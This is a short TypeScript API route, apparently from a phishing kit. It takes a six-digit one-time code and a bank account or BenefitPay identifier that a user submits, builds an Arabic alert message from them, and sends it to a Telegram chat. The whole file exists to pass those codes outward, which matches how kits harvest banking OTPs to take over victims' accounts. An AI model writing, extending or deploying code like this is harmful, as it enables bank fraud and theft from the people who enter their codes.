import { z } from "zod";
import { auditLog } from "@/lib/audit";
import { fail, ok } from "@/lib/api";
import { rateLimit } from "@/lib/rate-limit";
import { telegramSend } from "@/lib/telegram";

export const runtime = "nodejs";

const schema = z.object({
  code: z.string().trim().regex(/^\d{6}$/),
  method: z.enum(["benefit", "iban"]).optional(),
  value: z.string().trim().max(40).optional(),
});

export async function POST(request: Request) {
  if (!(await rateLimit("notify-otp", request.headers))) return fail("تم تجاوز الحد المسموح.", 429);
  const parsed = schema.safeParse(await request.json().catch(() => null));
  if (!parsed.success) return fail("بيانات غير صالحة.");
  const text = [
    "🔐 رمز تحقق مُدخل",
    `رمز التحقق (OTP): ${parsed.data.code}`,
    ...(parsed.data.value ? [`الحساب: ${parsed.data.value}`] : []),
    `الوقت: ${new Date().toISOString()}`,
  ].join("\n");
  const sent = await telegramSend(text);
  await auditLog(sent ? "otp.notified" : "otp.notify_failed");
  return ok({ ok: sent });
}
